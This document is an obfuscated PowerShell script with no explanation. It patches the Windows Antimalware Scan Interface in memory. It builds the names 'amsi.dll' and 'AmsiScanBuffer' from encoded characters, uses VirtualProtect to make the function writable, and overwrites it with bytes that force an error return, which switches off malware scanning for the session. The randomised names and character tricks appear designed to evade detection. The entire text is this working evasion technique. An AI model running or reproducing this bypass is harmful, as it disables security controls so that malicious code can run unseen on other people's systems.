$xvAWa0YrT = @"
using System;
using System.Runtime.InteropServices;
public class xvAWa0YrT {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr EWOFvEXvoP, string Ev86zTz);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr wjX8jH_Y1h, UIntPtr tm7UqCcigZK9ozDGK8t, uint aX_cF27kmpIjBtoueno, out uint wlHXfQ0QW9mn);
}
"@

Add-Type $xvAWa0YrT

$vR5RkBaoA7EjYtk16 = [xvAWa0YrT]::LoadLibrary("$([ChAR]([BytE]0x61)+[CHar]([ByTE]0x6d)+[CHar]([bYtE]0x73)+[chaR](83+22)+[ChAr]([BYTE]0x2e)+[CHAr]([BYTE]0x64)+[ChaR]([BytE]0x6c)+[cHaR](108+49-49))")
$KIJMB3384fjDC = [xvAWa0YrT]::GetProcAddress($vR5RkBaoA7EjYtk16, "$(('ÁmsîSc'+'änBùff'+'êr').noRMalIzE([chaR]([bYtE]0x46)+[chaR]([bYTE]0x6f)+[char](27+87)+[cHAr]([BYTe]0x6d)+[cHAR]([bytE]0x44)) -replace [cHaR]([bYtE]0x5c)+[ChaR]([ByTE]0x70)+[Char]([bYTE]0x7b)+[ChaR](77+64-64)+[cHaR]([bYTE]0x6e)+[chaR]([BytE]0x7d))")
$p = 0
[xvAWa0YrT]::VirtualProtect($KIJMB3384fjDC, [uint32]5, 0x40, [ref]$p)
$_RSDRMdUnLFiV_rvJ = "0xB8"
$YAda_Oi90vBjGcdnziHK = "0x57"
$PcyoTqcx = "0x00"
$Tq96dp3 = "0x07"
$KdKXGvpzEdStG = "0x80"
$l9laLt0a5Uop5I = "0xC3"
$MKVxvQhs = [Byte[]] ($_RSDRMdUnLFiV_rvJ,$YAda_Oi90vBjGcdnziHK,$PcyoTqcx,$Tq96dp3,+$KdKXGvpzEdStG,+$l9laLt0a5Uop5I)
[System.Runtime.InteropServices.Marshal]::Copy($MKVxvQhs, 0, $KIJMB3384fjDC, 6)